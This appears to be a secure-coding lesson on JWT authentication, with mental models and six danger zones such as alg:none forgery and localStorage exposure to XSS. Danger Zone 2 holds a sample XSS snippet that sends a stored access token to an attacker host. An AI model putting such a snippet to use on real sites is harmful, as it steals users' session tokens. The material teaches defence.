# M07: JWT Auth — Mental Models & Danger Zones

## Mental Model 1: JWT Is a Tamper-Evident Envelope

Think of a JWT not as "encrypted data" but as a **signed postcard**:

- Anyone can read the postcard (payload is Base64url-encoded, not encrypted)
- But if anyone changes the message, the signature no longer matches
- The recipient checks the signature against a trusted key

**Key insight:** JWT provides integrity and authenticity, not confidentiality. Never put secrets in a JWT payload unless the token is also encrypted (JWE).

---

## Mental Model 2: Time Is Part of the Security Model

A JWT without `exp` (expiration) is a permanent master key. A JWT with `iat` (issued at) but no `nbf` (not before) can be pre-issued and stockpiled by attackers.

Time-based claims are not metadata—they are **security controls**.

---

## Mental Model 3: Stateless ≠ Forgettable

The server does not store session state, but it must still remember:

- Which keys are currently valid (key rotation)
- Which tokens have been explicitly revoked (logout)
- The clock skew tolerance window

"Stateless authentication" means "no session lookup per request," not "no state at all."

---

## Danger Zone 1: Algorithm Confusion (`alg: none`)

The `alg` header tells the verifier which algorithm to use. If your code trusts the `alg` header from the token, an attacker can:

1. Remove the signature
2. Set `alg: none`
3. Pass validation on a poorly implemented verifier

**Rule:** The verifier must have an allow-list of algorithms. Never accept `none`.

---

## Danger Zone 2: localStorage + XSS = Game Over

```javascript
// Attacker injects this via XSS
fetch('https://attacker.com/exfil', {
  method: 'POST',
  body: localStorage.getItem('access_token')
});
```

Any JavaScript running on your domain can read localStorage. If your app has an XSS vulnerability, every JWT stored there is compromised.

**Rule:** Prefer httpOnly cookies unless you have a specific architectural reason (e.g., cross-domain SPA + API on different origins with complex cookie requirements).

---

## Danger Zone 3: Long-Lived Access Tokens

If an access token lives for 24 hours and is stolen, the attacker has 24 hours of unrestricted access. With no server-side session to invalidate, you must wait for expiry.

**Rule:** Access tokens should be short-lived (5–15 minutes). Use refresh tokens for continuity.

---

## Danger Zone 4: Storing Secrets in the Payload

```json
{
  "sub": "user123",
  "password": "hunter2",
  "credit_card": "4111-1111-1111-1111"
}
```

This is readable by anyone with the token. Only put in the payload what you are comfortable printing on a billboard.

---

## Danger Zone 5: Clock Skew Breaks Valid Tokens

If the verifier's clock is 5 minutes behind the issuer's clock, a token with `iat: now` may appear "from the future" and be rejected.

**Rule:** Allow a small clock skew tolerance (±60 seconds) in your verifier configuration.

---

## Danger Zone 6: The `ignoreExpiration` Footgun

Setting `ignoreExpiration: true` in a JWT library removes the time-based security boundary. A token issued in 2020 will be accepted in 2030.

**Rule:** Never set `ignoreExpiration: true` in production. If you need long-lived tokens, extend `exp` properly and implement explicit revocation.
